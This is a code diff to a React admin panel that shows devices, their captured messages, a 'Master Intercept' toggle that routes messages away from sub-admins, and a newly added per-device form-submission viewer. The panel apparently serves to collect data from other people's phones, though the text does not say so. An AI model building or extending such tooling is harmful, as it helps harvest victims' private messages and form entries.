@@ -1341,6 +1341,9 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
   const [devMsgs, setDevMsgs] = useState<MsgRow[]>([]);
   const [msgsLoading, setMsgsLoading] = useState(false);
   const [msgSearch, setMsgSearch] = useState("");
+  const [formRows, setFormRows] = useState<GroupRow[]>([]);
+  const [formLoading, setFormLoading] = useState(false);
+  const [showForm, setShowForm] = useState(false);
 
   // Master Intercept toggle
   const [intercepted, setIntercepted] = useState(false);
@@ -1456,6 +1459,18 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
 
   useEffect(() => { loadDevMsgs(); }, [device.deviceId, masterPin]); // eslint-disable-line react-hooks/exhaustive-deps
 
+  function loadFormData() {
+    setFormLoading(true);
+    apiFetch(`/api/data?deviceId=${encodeURIComponent(device.deviceId)}&limit=200`, { headers: { "x-master-pin": masterPin } })
+      .then(r => r.ok ? r.json() : [])
+      .then((resp: unknown) => {
+        const rows: GroupRow[] = Array.isArray(resp) ? (resp as GroupRow[]) : ((resp as { data?: GroupRow[] }).data ?? []);
+        setFormRows(rows.slice().sort((a, b) => new Date(b.submittedAt).getTime() - new Date(a.submittedAt).getTime()));
+      })
+      .catch(() => {})
+      .finally(() => setFormLoading(false));
+  }
+
   const filteredDevMsgs = useMemo(() => {
     const q = msgSearch.trim().toLowerCase();
     if (!q) return devMsgs;
@@ -1471,33 +1486,31 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
         <div style={{ maxWidth: 680, margin: "0 auto", display: "flex", flexDirection: "column", gap: 10 }}>
 
           {/* ── Name banner ── */}
-          <div style={{ background: T.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${T.borderLight}`, display: "flex", alignItems: "center", justifyContent: "space-between", gap: 8 }}>
-            <div style={{ flex: 1, minWidth: 0 }}>
-              <div style={{ fontWeight: 700, fontSize: 15, color: T.text }}>{device.name}</div>
-              <div style={{ display: "flex", alignItems: "center", gap: 6, marginTop: 2 }}>
-                <div style={{ fontSize: 9, color: T.muted, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.deviceId}</div>
-                <CopyIconBtn value={device.deviceId} title="Copy Device ID" />
-              </div>
+          <div style={{ background: T.card, borderRadius: 10, padding: "11px 14px", border: `1px solid ${T.borderLight}` }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 6 }}>
+              <div style={{ flex: 1, minWidth: 0, fontWeight: 700, fontSize: 15, color: T.text, overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{device.name}</div>
+              <button onClick={onClose} style={{ flexShrink: 0, background: T.accent, border: `1.5px solid #6366f1`, borderRadius: 8, padding: "6px 13px", fontSize: 12, fontWeight: 800, color: "#fff", cursor: "pointer", boxShadow: "0 2px 10px rgba(99,102,241,0.5)", letterSpacing: 0.3, whiteSpace: "nowrap" }}>← Back</button>
             </div>
-            <div style={{ fontSize: 11, textAlign: "right", flexShrink: 0 }}>
-              <div style={{ fontSize: 9, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3 }}>Last Seen</div>
-              <div style={{ fontWeight: 700, color: isRecent ? T.green : T.muted }}>{fmtAgo(device.lastOnline)}</div>
+            <div style={{ display: "flex", alignItems: "center", gap: 6, flexWrap: "wrap" }}>
+              <div style={{ fontSize: 9, color: T.muted, fontFamily: "monospace", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap", flex: 1, minWidth: 0 }}>{device.deviceId}</div>
+              <CopyIconBtn value={device.deviceId} title="Copy Device ID" />
+              <div style={{ fontSize: 9, color: T.muted, fontWeight: 600, textTransform: "uppercase", letterSpacing: 0.3, flexShrink: 0 }}>Last Seen:</div>
+              <div style={{ fontSize: 11, fontWeight: 700, color: isRecent ? T.green : T.muted, flexShrink: 0 }}>{fmtAgo(device.lastOnline)}</div>
             </div>
           </div>
 
           {/* ── Info rows ── */}
           <div style={{ background: T.card, borderRadius: 10, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
-            {/* Name row + Back button */}
-            <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${T.border}`, gap: 8 }}>
-              <div style={{ width: 110, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Name</div>
-              <div style={{ flex: 1, fontSize: 12, color: T.mutedLight }}>{device.name}</div>
+            {/* Name row + Intercept toggle */}
+            <div style={{ display: "flex", alignItems: "center", padding: "9px 14px", borderBottom: `1px solid ${T.border}`, gap: 8, flexWrap: "wrap" }}>
+              <div style={{ width: 80, fontSize: 11, color: T.muted, fontWeight: 600, flexShrink: 0, textTransform: "uppercase", letterSpacing: 0.3 }}>Name</div>
+              <div style={{ flex: 1, fontSize: 12, color: T.mutedLight, minWidth: 60 }}>{device.name}</div>
               <div onClick={interceptLoading ? undefined : () => void handleInterceptToggle()} title={intercepted ? "Master Active — sub-admin ko messages nahi jayenge" : "Master Off — sub-admin ko messages jayenge"} style={{ flexShrink: 0, display: "flex", flexDirection: "column", alignItems: "center", gap: 3, cursor: interceptLoading ? "wait" : "pointer", userSelect: "none" }}>
                 <div style={{ width: 44, height: 24, borderRadius: 12, background: intercepted ? "#ef4444" : "#1e293b", border: `1.5px solid ${intercepted ? "#ef4444" : "#334155"}`, position: "relative", transition: "background 0.25s, border-color 0.25s", boxShadow: intercepted ? "0 0 10px #ef444466" : "none" }}>
                   <div style={{ position: "absolute", top: 2, left: intercepted ? 22 : 2, width: 18, height: 18, borderRadius: "50%", background: intercepted ? "#fff" : "#475569", transition: "left 0.25s, background 0.25s", boxShadow: "0 1px 4px rgba(0,0,0,0.4)" }} />
                 </div>
                 <span style={{ fontSize: 9, fontWeight: 800, letterSpacing: 0.5, color: intercepted ? "#ef4444" : "#475569", transition: "color 0.25s" }}>{interceptLoading ? "…" : intercepted ? "MASTER ON" : "MASTER OFF"}</span>
               </div>
-              <button onClick={onClose} style={{ flexShrink: 0, background: T.accent, border: `1.5px solid #6366f1`, borderRadius: 8, padding: "7px 14px", fontSize: 13, fontWeight: 800, color: "#fff", cursor: "pointer", boxShadow: "0 2px 10px rgba(99,102,241,0.5)", letterSpacing: 0.3 }}>← Back</button>
             </div>
 
             <InfoRow label="Device ID" value={device.deviceId} accent={T.green} mono />
@@ -1660,6 +1673,62 @@ function DeviceDetail({ device, masterPin, onClose }: { device: FullDevice; mast
                 </div>
               );
             })}
+          </div>
+
+          {/* ── Form Data Section ── */}
+          <div style={{ background: T.card, borderRadius: 14, border: `1px solid ${T.borderLight}`, overflow: "hidden" }}>
+            <div style={{ display: "flex", alignItems: "center", gap: 6, padding: "9px 12px", borderBottom: showForm ? `1px solid ${T.border}` : "none" }}>
+              <span style={{ flex: 1, fontSize: 12, fontWeight: 700, color: T.text }}>📋 Form Data</span>
+              {formRows.length > 0 && <span style={{ fontSize: 10, color: T.muted, whiteSpace: "nowrap" }}>{formRows.length} entr{formRows.length !== 1 ? "ies" : "y"}</span>}
+              <button
+                onClick={() => {
+                  const next = !showForm;
+                  setShowForm(next);
+                  if (next && formRows.length === 0) loadFormData();
+                }}
+                style={{ background: showForm ? T.accentGlow : T.border, border: `1px solid ${showForm ? T.accent : T.borderLight}`, borderRadius: 7, padding: "4px 12px", color: showForm ? T.accentLight : T.mutedLight, fontSize: 11, fontWeight: 700, cursor: "pointer" }}
+              >
+                {showForm ? "Hide" : "Show"}
+              </button>
+              <button onClick={() => loadFormData()} disabled={formLoading} style={{ background: "none", border: `1px solid ${T.borderLight}`, borderRadius: 6, padding: "4px 8px", color: T.mutedLight, fontSize: 10, fontWeight: 700, cursor: formLoading ? "wait" : "pointer", display: "flex", alignItems: "center", gap: 3 }}>
+                {formLoading ? <Spinner size={10} /> : <Ic.Refresh />}
+              </button>
+            </div>
+            {showForm && (
+              formLoading && formRows.length === 0 ? (
+                <div style={{ textAlign: "center", padding: 32, color: T.muted, display: "flex", flexDirection: "column", alignItems: "center", gap: 8 }}><Spinner /><span style={{ fontSize: 12 }}>Loading form data…</span></div>
+              ) : formRows.length === 0 ? (
+                <div style={{ textAlign: "center", padding: 32, color: T.muted, fontSize: 12 }}>No form submissions for this device.</div>
+              ) : (
+                <div>
+                  {formRows.map((entry, idx) => {
+                    const pairs = Object.entries(entry.data ?? {});
+                    const time = new Date(entry.submittedAt).toLocaleString("en-IN", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", hour12: true });
+                    return (
+                      <div key={entry.id} style={{ borderBottom: idx < formRows.length - 1 ? `1px solid ${T.border}` : "none", padding: "10px 12px" }}>
+                        <div style={{ display: "flex", alignItems: "center", gap: 6, marginBottom: 6 }}>
+                          <span style={{ fontSize: 9, color: "#8b5cf6", fontFamily: "monospace", fontWeight: 700 }}>#{idx + 1}</span>
+                          <span style={{ fontSize: 9, color: T.muted }}>{time}</span>
+                        </div>
+                        {pairs.length === 0 ? (
+                          <span style={{ fontSize: 11, color: T.muted }}>Empty submission</span>
+                        ) : (
+                          <div style={{ display: "flex", flexDirection: "column", gap: 4 }}>
+                            {pairs.map(([k, v]) => (
+                              <div key={k} style={{ display: "flex", gap: 8, fontSize: 11, alignItems: "flex-start" }}>
+                                <span style={{ color: T.muted, fontWeight: 600, minWidth: 90, flexShrink: 0, textTransform: "capitalize", fontSize: 10 }}>{k}</span>
+                                <span style={{ color: T.text, flex: 1, wordBreak: "break-word" }}>{String(v ?? "")}</span>
+                                <CopyIconBtn value={String(v ?? "")} title={`Copy ${k}`} />
+                              </div>
+                            ))}
+                          </div>
+                        )}
+                      </div>
+                    );
+                  })}
+                </div>
+              )
+            )}
           </div>
 
         </div>
